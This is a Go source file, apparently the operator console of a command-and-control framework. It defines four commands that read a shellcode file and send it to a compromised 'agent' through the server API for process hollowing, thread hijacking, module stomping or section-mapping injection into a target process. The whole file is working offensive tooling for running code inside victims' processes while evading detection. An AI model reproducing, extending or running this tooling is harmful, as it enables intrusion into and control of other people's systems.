package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

// ─── hollow ──────────────────────────────────────────────────────────────────

var hollowCmd = &cobra.Command{
	Use:   "hollow <agent-id>",
	Short: "Process hollowing — spawn host exe suspended, redirect RIP to shellcode",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		file, _ := cmd.Flags().GetString("file")
		exe, _ := cmd.Flags().GetString("exe")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if file == "" {
			printError("--file is required")
			os.Exit(1)
		}
		sc, err := os.ReadFile(file)
		if err != nil {
			printError(fmt.Sprintf("read shellcode: %v", err))
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{
			"shellcode_b64": base64.StdEncoding.EncodeToString(sc),
			"exe":           exe,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/inject/hollow",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("hollow failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := resp.Error
			if msg == "" {
				msg = "unknown error"
			}
			printError(fmt.Sprintf("hollow failed: %s", msg))
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Process hollowing queued (%d bytes → %s)", len(sc), exe))
		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// ─── hijack ──────────────────────────────────────────────────────────────────

var hijackCmd = &cobra.Command{
	Use:   "hijack <agent-id>",
	Short: "Thread hijacking — suspend first thread, patch RIP to shellcode, resume",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		file, _ := cmd.Flags().GetString("file")
		pid, _ := cmd.Flags().GetUint32("pid")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if file == "" || pid == 0 {
			printError("--file and --pid are required")
			os.Exit(1)
		}
		sc, err := os.ReadFile(file)
		if err != nil {
			printError(fmt.Sprintf("read shellcode: %v", err))
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{
			"pid":           pid,
			"shellcode_b64": base64.StdEncoding.EncodeToString(sc),
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/inject/hijack",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("hijack failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := resp.Error
			if msg == "" {
				msg = "unknown error"
			}
			printError(fmt.Sprintf("hijack failed: %s", msg))
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Thread hijack queued (%d bytes → PID %d)", len(sc), pid))
		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// ─── stomp ───────────────────────────────────────────────────────────────────

var stompCmd = &cobra.Command{
	Use:   "stomp <agent-id>",
	Short: "Module stomping — overwrite sacrificial DLL .text section with shellcode",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		file, _ := cmd.Flags().GetString("file")
		dll, _ := cmd.Flags().GetString("dll")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if file == "" {
			printError("--file is required")
			os.Exit(1)
		}
		sc, err := os.ReadFile(file)
		if err != nil {
			printError(fmt.Sprintf("read shellcode: %v", err))
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{
			"dll":           dll,
			"shellcode_b64": base64.StdEncoding.EncodeToString(sc),
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/inject/stomp",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("stomp failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := resp.Error
			if msg == "" {
				msg = "unknown error"
			}
			printError(fmt.Sprintf("stomp failed: %s", msg))
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Module stomp queued (%d bytes → %s)", len(sc), dll))
		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// ─── mapinject ───────────────────────────────────────────────────────────────

var mapInjectCmd = &cobra.Command{
	Use:   "mapinject <agent-id>",
	Short: "Section mapping injection — NtCreateSection/NtMapViewOfSection (no WriteProcessMemory)",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		file, _ := cmd.Flags().GetString("file")
		pid, _ := cmd.Flags().GetUint32("pid")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if file == "" {
			printError("--file is required")
			os.Exit(1)
		}
		sc, err := os.ReadFile(file)
		if err != nil {
			printError(fmt.Sprintf("read shellcode: %v", err))
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{
			"pid":           pid,
			"shellcode_b64": base64.StdEncoding.EncodeToString(sc),
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/inject/map",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("mapinject failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := resp.Error
			if msg == "" {
				msg = "unknown error"
			}
			printError(fmt.Sprintf("mapinject failed: %s", msg))
			os.Exit(1)
		}
		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		target := "local"
		if pid > 0 {
			target = fmt.Sprintf("PID %d", pid)
		}
		printSuccess(fmt.Sprintf("Section mapping injection queued (%d bytes → %s)", len(sc), target))
		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}
